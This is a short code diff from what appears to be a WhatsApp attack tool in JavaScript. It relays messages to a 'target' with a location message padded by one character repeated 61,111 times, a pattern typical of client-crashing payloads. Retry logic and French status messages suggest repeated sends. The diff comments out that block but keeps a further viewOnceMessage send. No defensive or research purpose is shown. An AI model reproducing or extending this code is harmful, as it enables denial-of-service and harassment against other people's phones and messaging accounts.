@@ -309,7 +309,7 @@ export default {
         }
         await new Promise(resolve => setTimeout(resolve, 800));*/
 
-        const uw2 = "ꦾ".repeat(61111);
+       /* const uw2 = "ꦾ".repeat(61111);
         try {
           await trim.relayMessage(target, {
             locationMessage: {
@@ -374,7 +374,7 @@ export default {
           context.onStatus?.(`Ligne 2⚠️ Action ratée — ${JSON.stringify(errorDetails, null, 2)}\n🔄 Nouvelle tentative dans 2s`);
         }
         await new Promise(resolve => setTimeout(resolve, 1200));
-
+*/
         try {
           await trim.relayMessage(target, {
             viewOnceMessage: {
